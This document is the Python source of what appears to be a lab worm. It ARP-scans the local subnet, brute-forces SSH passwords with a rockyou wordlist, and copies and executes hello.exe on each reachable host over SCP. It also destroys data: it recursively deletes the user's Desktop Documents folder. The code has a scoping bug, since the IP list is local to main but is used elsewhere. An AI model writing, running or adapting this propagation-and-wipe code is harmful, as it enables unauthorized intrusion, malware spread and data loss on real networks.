import paramiko, getpass,os, socket,shutil, subprocess, wmi
from scp import SCPClient
from classes.gateway import *
from classes.arpy import *
from classes.bruteforce import *

user = getpass.getuser()

##Default location where you want to copy the file from
file = f"C:/Users/{user}/Desktop/hello.exe"

## Function to SSH to the desire server
def createSSHClient(server, port, users, password):
    client = paramiko.SSHClient()
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(server, port, users, password)
    return client



## Finding my current IP and see if its the affected computer
def findmyIP():
    hostname = socket.gethostname()
    return True if(socket.gethostbyname(hostname) == "10.0.2.8") else False

## running SCP to copy the file across the network
def runThisSCP(password):
    port=22
    print("hit")
    for i,ipnet in enumerate(list_IP):
        try:
            if i not in (0,1,2,len(list_IP)-1):
                print(ipnet)
                ssh = createSSHClient(ipnet, port, user, password)
                scp = SCPClient(ssh.get_transport())
                scp.put(file, f"C:/Users/{user}/Desktop/")
                ssh.exec_command(file)
                ssh.close()
        except:
            print("errored out")
            continue

## finding the target file to delete
def findtheFile():
    target = f"C:/Users/{user}/Desktop/Documents"
    if(os.path.isdir(target)):
        shutil.rmtree(target)




def main():
    d_gateway = get_defaultGateay()
    subnet = f"{d_gateway}/24"
    findtheFile()
    list_IP = arpy(subnet)
    if(findmyIP()):
        create_rockyou()
        password_list = read_txt()
        pw = crack_ssh(password_list)
        runThisSCP(pw)
        remove_file(os.path.abspath("./rockyou.txt"))

if __name__ == "__main__":
    main()
